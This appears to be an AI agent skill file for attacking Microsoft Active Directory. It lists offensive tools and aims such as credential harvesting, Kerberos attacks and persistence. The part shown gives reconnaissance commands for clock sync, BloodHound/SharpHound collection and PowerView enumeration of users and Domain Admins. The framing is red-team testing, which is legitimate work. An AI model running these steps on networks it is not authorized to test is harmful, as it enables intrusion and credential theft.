---
name: active-directory-attacks
description: Use this skill when you need to perform penetration testing on Microsoft Active Directory environments, including techniques for credential harvesting, Kerberos attacks, and lateral movement.
---

# Active Directory Attacks

## Purpose

Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.

## Inputs/Prerequisites

- Kali Linux or Windows attack platform
- Domain user credentials (for most attacks)
- Network access to Domain Controller
- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec

## Outputs/Deliverables

- Domain enumeration data
- Extracted credentials and hashes
- Kerberos tickets for impersonation
- Domain Administrator access
- Persistent access mechanisms

## Essential Tools

| Tool       | Purpose                          |
|------------|----------------------------------|
| BloodHound | AD attack path visualization     |
| Impacket   | Python AD attack tools           |
| Mimikatz   | Credential extraction            |
| Rubeus     | Kerberos attacks                 |
| CrackMapExec | Network exploitation           |
| PowerView  | AD enumeration                   |
| Responder  | LLMNR/NBT-NS poisoning          |

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires clock synchronization (±5 minutes):

```bash
# Detect clock skew
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2024 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (from Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Step 3: PowerView Enumeration

```powershell
# Get domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# Enumerate users
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Enumerate groups
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member
```